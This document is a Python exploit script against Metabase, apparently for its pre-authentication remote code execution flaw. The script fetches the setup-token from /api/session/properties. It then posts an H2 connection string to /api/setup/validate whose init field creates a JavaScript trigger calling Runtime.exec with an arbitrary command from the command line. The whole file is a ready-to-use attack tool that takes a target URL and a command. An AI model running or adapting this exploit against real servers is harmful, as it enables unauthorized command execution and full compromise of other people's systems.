import argparse
from urllib.parse import urljoin
import requests
import regex
import logging
import json
import sys

logging.basicConfig(stream=sys.stdout, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


def get_token(target: str):
    url = urljoin(target, "/api/session/properties")
    # print(url)
    response = requests.get(url=url, allow_redirects=False)
    assert response.status_code == 200
    # print(response.text)
    matchobj = regex.findall(r"\"setup-token\":\"(.*?)\"", response.text)
    # print(matchobj)
    token = matchobj[0]
    logging.info("Setup-token:%s", token)
    return token


def exploit(target: str, token: str, cmd: str):
    url = urljoin(target, "/api/setup/validate")
    data = {
        "token": token,
        "details":
        {
            "is_on_demand": False,
            "is_full_sync": False,
            "is_sample": False,
            "cache_ttl": None,
            "refingerprint": False,
            "auto_run_queries": True,
            "schedules":
            {},
            "details":
            {
                "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;",
                "advanced-options": False,
                "ssl": True,
                "init": f"CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\u000A\u0009java.lang.Runtime.getRuntime().exec('{cmd}')\u000A$$"
            },
            "name": "an-sec-research-team",
            "engine": "h2"
        }
    }
    print(data)
    headers = {'Content-type': 'application/json'}
    response = requests.post(url=url, json=data, headers=headers, verify=False)
    print(response.text)


def main(target: str, cmd: str):
    token = get_token(target)
    exploit(target, token, cmd)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', type=str, required=True, help="")
    parser.add_argument('-c', '--command', type=str, required=True, help="No echo Command Execution")
    args = parser.parse_args()
    # print(args)
    main(args.url, args.command)